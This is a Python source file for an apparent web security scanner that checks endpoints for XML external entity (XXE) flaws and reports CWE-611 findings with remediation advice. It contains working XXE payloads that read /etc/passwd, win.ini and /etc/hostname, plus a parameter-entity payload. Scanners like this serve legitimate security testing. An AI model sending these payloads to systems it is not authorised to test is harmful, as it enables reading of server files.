"""
XML External Entity (XXE) Vulnerability Scanner.
Tests for XXE injection with both in-band and out-of-band detection techniques.
"""
import logging
import re
from typing import List
from models import Finding
from scanner.core.requester import Requester

logger = logging.getLogger(__name__)

class XXEScanner:
    """
    Scanner for XML External Entity (XXE) vulnerabilities.
    """
    def __init__(self):
        self.requester = Requester()
        # Using unique marker for in-band detection
        self.marker = "XXE_DETECTION_MARKER_9218"

    def scan(self, url: str) -> List[Finding]:
        findings = []
        
        # Test 1: Basic Entity Expansion (In-Band)
        findings.extend(self._test_basic_entity_expansion(url))
        
        # Test 2: File Disclosure via XXE
        findings.extend(self._test_file_disclosure(url))
        
        # Test 3: Check if endpoint processes XML (passive)
        findings.extend(self._check_xml_processing(url))
        
        return findings
    
    def _test_basic_entity_expansion(self, url: str) -> List[Finding]:
        """Test basic XXE with entity expansion."""
        findings = []
        
        # Payload with internal entity
        payload_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
    <!ENTITY xxe_test "{self.marker}"> 
]>
<root>
    <name>&xxe_test;</name>
    <data>&xxe_test;</data>
</root>"""

        headers = {"Content-Type": "application/xml"}

        try:
            response = self.requester.post(url, data=payload_body, headers=headers, timeout=5)
            
            # Check if the entity was expanded and reflected
            if self.marker in response.text:
                findings.append(Finding(
                    title="XML External Entity (XXE) - Entity Expansion",
                    severity="HIGH",
                    description=f"The application parsed and expanded an XML entity. The marker '{self.marker}' was reflected in the response, confirming the XML parser processes DTDs and entities.",
                    location=f"{url} (POST Body)",
                    recommendation="Disable DTD processing and external entity resolution in your XML parser configuration. Use libraries configured for safe XML parsing.",
                    cwe_reference="CWE-611",
                    confidence="High"
                ))

        except Exception as e:
            logger.debug(f"Error testing basic XXE: {e}")
            
        return findings
    
    def _test_file_disclosure(self, url: str) -> List[Finding]:
        """Test XXE for local file disclosure."""
        findings = []
        
        # Payloads targeting common system files
        file_payloads = [
            ('<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><data>&xxe;</data></root>', 
             ['root:x:', 'bin:', 'daemon:'], 
             '/etc/passwd'),
            ('<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><root><data>&xxe;</data></root>', 
             ['[fonts]', '[extensions]', '[mci extensions]'], 
             'C:/windows/win.ini'),
            ('<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]><root><data>&xxe;</data></root>', 
             None, 
             '/etc/hostname')
        ]
        
        headers = {"Content-Type": "application/xml"}
        
        for payload, signatures, file_path in file_payloads:
            try:
                response = self.requester.post(url, data=payload, headers=headers, timeout=5)
                
                # Check for file content indicators
                if signatures:
                    for sig in signatures:
                        if sig in response.text:
                            findings.append(Finding(
                                title="XML External Entity (XXE) - File Disclosure",
                                severity="CRITICAL",
                                description=f"The application is vulnerable to XXE file disclosure. Successfully read system file '{file_path}'. Signature '{sig}' found in response.",
                                location=f"{url} (POST Body)",
                                recommendation="Immediately disable DTD processing and external entity resolution. This is a critical vulnerability allowing attackers to read arbitrary files.",
                                cwe_reference="CWE-611",
                                confidence="High"
                            ))
                            return findings  # Found critical vuln, stop testing
                else:
                    # For hostname or files without clear signatures
                    # Check if response is suspiciously different and contains file-like content
                    if len(response.text) > 10 and not payload in response.text:
                        # Might have worked, but we can't be 100% sure
                        pass
                        
            except Exception as e:
                logger.debug(f"Error testing XXE file disclosure: {e}")
        
        return findings
    
    def _test_parameter_entity_attack(self, url: str) -> List[Finding]:
        """Test XXE using parameter entities (for blind XXE)."""
        findings = []
        
        # Blind XXE using parameter entities
        # Note: This typically requires an attacker-controlled server for out-of-band
        # For now, we test if parameter entities are processed
        
        payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///etc/hostname'>">
    %eval;
    %exfil;
]>
<root>
    <data>test</data>
</root>"""
        
        headers = {"Content-Type": "application/xml"}
        
        try:
            response = self.requester.post(url, data=payload, headers=headers, timeout=5)
            
            # If we get a parsing error mentioning entities, parser supports parameter entities
            error_indicators = ['entity', 'dtd', 'external', 'parameter', 'parsing']
            if any(ind in response.text.lower() for ind in error_indicators) and response.status_code >= 400:
                findings.append(Finding(
                    title="XXE Parameter Entity Processing Detected",
                    severity="MEDIUM",
                    description="The XML parser appears to process parameter entities, as indicated by parsing errors. This may be exploitable for blind XXE attacks.",
                    location=f"{url} (POST Body)",
                    recommendation="Disable all DTD processing, including parameter entities. Configure XML parser to reject any DOCTYPE declarations.",
                    cwe_reference="CWE-611",
                    confidence="Medium"
                ))
                
        except Exception as e:
            logger.debug(f"Error testing parameter entity XXE: {e}")
        
        return findings
    
    def _check_xml_processing(self, url: str) -> List[Finding]:
        """Passively check if endpoint processes XML."""
        findings = []
        
        try:
            # Send simple XML
            simple_xml = '<?xml version="1.0"?><root><test>data</test></root>'
            headers = {"Content-Type": "application/xml"}
            
            response = self.requester.post(url, data=simple_xml, headers=headers, timeout=5)
            
            # Check response for XML processing indicators
            content_type = response.headers.get('Content-Type', '').lower()
            
            # If endpoint accepts XML or returns XML
            if response.status_code in [200, 201, 202] or 'xml' in content_type:
                # Check if response looks like it processed our XML
                if 'test' in response.text or 'data' in response.text or 'xml' in response.text.lower():
                    findings.append(Finding(
                        title="XML Processing Endpoint Detected",
                        severity="LOW",
                        description="Endpoint appears to process XML input. If XML parsers are not configured correctly, it may be vulnerable to XXE attacks.",
                        location=url,
                        recommendation="Ensure XML parser is configured to disable DTD processing and external entity resolution. Use modern libraries with safe defaults.",
                        cwe_reference="CWE-611",
                        confidence="Medium"
                    ))
                    
        except Exception:
            pass
            
        return findings
    
    def check_response_for_xxe_potential(self, response) -> List[Finding]:
        """Helper method to check if a response indicates XML processing."""
        findings = []
        if 'xml' in response.headers.get('Content-Type', '').lower():
             findings.append(Finding(
                title="XML Content-Type Detected",
                severity="INFO",
                description="Response has XML Content-Type. Endpoint may process XML and could be vulnerable to XXE if not properly configured.",
                location=response.url,
                recommendation="Disable DTD processing (external entities) in your XML parser configuration.",
                cwe_reference="CWE-611"
            ))
        return findings
